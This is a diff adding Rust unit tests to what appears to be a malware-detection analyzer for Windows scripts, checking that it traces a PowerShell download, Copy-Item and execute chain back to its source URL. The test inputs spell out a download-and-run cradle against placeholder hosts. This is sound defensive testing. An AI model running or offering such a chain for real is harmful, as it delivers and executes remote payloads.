@@ -10693,6 +10693,56 @@ powershell -NoProfile -File "%TEMP%\copied.ps1""#,
     }
 
     #[test]
+    fn powershell_copy_item_preserves_download_provenance() {
+        let report = analyze(
+            br#"powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://ps-copy-item-provenance.example/stage.ps1','%TEMP%\downloaded.ps1')"
+powershell -Command "Copy-Item -Path '%TEMP%\downloaded.ps1' -Destination '%TEMP%\copied.ps1'"
+powershell -NoProfile -File "%TEMP%\copied.ps1""#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd.contains("-File")
+                        && cmd.contains("copied.ps1")
+                        && url == "https://ps-copy-item-provenance.example/stage.ps1"
+            )),
+            "PowerShell Copy-Item script execution did not resolve original download URL: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn powershell_copy_item_preserves_script_content() {
+        let mut env = Environment::new(&Config::default());
+        let ps1 = b"Invoke-WebRequest https://ps-copy-content.example/stage.ps1".to_vec();
+        env.modified_filesystem.insert(
+            r#"c:\temp\source.ps1"#.to_string(),
+            FsEntry::Content {
+                content: ps1.clone(),
+                append: false,
+            },
+        );
+
+        interpret_line(
+            r#"powershell -Command "Copy-Item -Path C:\Temp\source.ps1 -Destination C:\Temp\copied.ps1""#,
+            &mut env,
+        );
+        interpret_line(
+            r#"powershell -NoProfile -File C:\Temp\copied.ps1"#,
+            &mut env,
+        );
+
+        assert!(
+            env.exec_ps1.iter().any(|payload| payload == &ps1),
+            "PowerShell Copy-Item script content was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
     fn powershell_get_content_out_file_preserves_script_content() {
         let mut env = Environment::new(&Config::default());
         let ps1 = b"Invoke-WebRequest https://ps-out-file-copy.example/stage.ps1".to_vec();
